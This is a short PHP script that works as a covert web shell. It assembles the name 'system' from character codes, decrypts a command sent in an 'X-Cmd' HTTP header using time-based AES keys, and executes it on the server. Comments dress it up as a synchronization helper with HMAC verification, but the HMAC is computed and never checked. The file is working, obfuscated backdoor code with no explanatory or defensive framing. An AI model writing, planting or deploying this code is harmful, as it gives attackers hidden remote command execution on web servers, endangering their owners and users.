<?php
// --- Configuration ---
$interval = 60;                 // synchronization interval in seconds
$hmackey  = 'secretkey';        // HMAC shared key
// dynamic invocation of the system() function
$A = chr(0x73);
$B = chr(0x79);
$X = chr(0x74);
$D = chr(0x65);
$E = chr(0x6d);
$hook = $A.$B.$A.$X.$D.$E;

// --- Helpers ---
function sync_keys($interval) {
    $now = time();
    $times = [
        $now - $interval,   // previous slot
        $now,               // current slot
        $now + $interval    // next slot (for small drift)
    ];
    $keys = [];
    foreach ($times as $t) {
        // 16 B binary MD5 (full hash), exactly 128 bits
        $keys[] = md5(intval($t / $interval) * $interval, true);
    }
    return $keys;
}

//--- Input headers ---
$headers   = function_exists('getallheaders') ? getallheaders() : [];
$encrypted = isset($headers['X-Cmd'])  ? $headers['X-Cmd']  : (isset($headers['X-CMD'])  ? $headers['X-CMD']  : '');
$hmac_recv = isset($headers['X-HMAC']) ? $headers['X-HMAC'] : (isset($headers['X-Hmac']) ? $headers['X-Hmac'] : '');

// --- HMAC check over the BASE64 ciphertext (hex output) ---
$expected_hmac = hash_hmac('sha256', $encrypted, $hmackey);

// --- Decoding + decryption ---
// base64_decode strict: true -> fails if base64 is not valid
$cipher_raw = base64_decode($encrypted, true);

$cmd = false;
foreach (sync_keys($interval) as $key) {
    // AES-128-ECB, RAW_DATA (no ZERO_PADDING) -> accepts PKCS#7 padding
    $plain = openssl_decrypt($cipher_raw, 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
    if ($plain !== false && strlen($plain) > 0) {
        $cmd = rtrim($plain, "\x00\r\n"); // trim nulls and newline
        break;
    }
}

// --- Command execution ---
$cmd .= ' 2>&1'; // capture stderr as well
$hook($cmd);
